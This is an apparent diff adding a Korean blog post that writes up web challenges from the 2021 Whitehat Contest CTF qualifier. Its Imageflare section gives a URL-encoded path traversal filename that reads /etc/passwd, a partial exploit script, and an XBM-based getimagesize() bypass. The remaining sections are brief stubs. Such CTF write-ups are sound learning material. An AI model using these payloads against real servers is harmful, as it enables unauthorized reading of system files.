@@ -1,0 +1,64 @@
+---
+title: "2021 화이트햇콘테스트 웹 분야 Writeup"
+description: "2021 화이트햇콘테스트 예선 웹 문제 풀이 - Imageflare, mudbox, mini-realworld"
+date: 2021-10-20
+tags: ["whitehat", "file-upload", "path-traversal", "php"]
+ctf: "Whitehat Contest 2021"
+published: true
+---
+
+# 2021 화이트햇콘테스트 웹 분야 Writeup
+
+## Imageflare (v1)
+
+### 취약점
+
+파일명에 path traversal 가능:
+
+```python
+files = {
+    'file': ('..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd', f, 'image/png')
+}
+```
+
+위와같이 file name을 구성함으로써 file download가 가능해진다.
+
+### Exploit 코드
+
+```python
+from arang import *
+import re, sys
+
+def dopow(x):
+    for i in range(0, 10000000):
+        if hexencode(sha1(str(i)))[:5] == x:
+            return i
+    return 'false'
+
+fname = urlencode(f"../../../../../../../../../../../../{sys.argv[1]}").replace("/", "%2f")
+# ... exploit
+```
+
+---
+
+## Imageflare v2
+
+### 취약점
+
+`getimagesize()` 우회를 위해 **XBM 포맷** 사용
+
+```
+#define을 통해 xbm은 image size를 parsing하기 때문에 getimagesize 우회된다.
+```
+
+---
+
+## mudbox
+
+서버 측 코드 분석을 통한 취약점 발견 및 익스플로잇
+
+---
+
+## mini-realworld
+
+실제 환경과 유사한 시나리오의 웹 문제
